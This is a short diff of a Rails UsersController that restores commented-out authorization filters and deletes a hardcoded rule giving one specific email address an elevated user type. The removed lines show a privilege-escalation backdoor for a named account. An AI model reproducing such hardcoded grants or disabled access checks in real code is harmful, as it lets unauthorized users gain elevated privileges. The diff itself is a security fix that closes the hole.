@@ -1,6 +1,6 @@
 class UsersController < ApplicationController
-  # before_filter :authorize
-  # before_filter :is_parent, except: [:show]
+  before_filter :authorize
+  before_filter :is_parent, except: [:show]
 
   def show
     @user = User.find(params[:id])
@@ -100,10 +100,6 @@ class UsersController < ApplicationController
       else
         @user.user_type = 10
       end
-    end
-
-    if @user.email == "mizisaac79@gmail.com"
-      @user.user_type = 20
     end
 
     respond_to do |format|
